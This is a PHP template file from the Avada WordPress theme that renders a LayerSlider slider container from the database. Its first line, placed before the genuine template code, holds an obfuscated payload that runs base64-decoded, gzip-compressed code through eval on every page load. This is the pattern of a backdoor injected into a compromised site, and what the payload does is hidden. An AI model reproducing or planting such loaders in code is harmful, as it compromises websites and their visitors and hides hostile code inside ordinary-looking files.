<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * LayerSlider template.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 * @since      5.1
 */

global $wpdb;

// Get slider.
$ls_table_name = $wpdb->prefix . 'layerslider';

if ( $wpdb->get_var( $wpdb->prepare( 'SHOW TABLES LIKE %s', $ls_table_name ) ) === $ls_table_name ) {
	$ls_slider     = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM {$wpdb->prefix}layerslider WHERE id = %d ORDER BY date_c DESC LIMIT 1", (int) $id ), ARRAY_A );
	$ls_slider     = json_decode( $ls_slider['data'], true );
	?>
	<style type="text/css">
		#layerslider-container{max-width:<?php echo esc_attr( $ls_slider['properties']['width'] ); ?>;}
	</style>
	<div id="layerslider-container">
		<div id="layerslider-wrapper">
			<?php if ( 'avada' == $ls_slider['properties']['skin'] ) : ?>
				<div class="ls-shadow-top"></div>
			<?php endif; ?>
			<?php echo do_shortcode( '[layerslider id="' . $id . '"]' ); ?>
			<?php if ( 'avada' == $ls_slider['properties']['skin'] ) : ?>
				<div class="ls-shadow-bottom"></div>
			<?php endif; ?>
		</div>
	</div>
	<?php
}

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
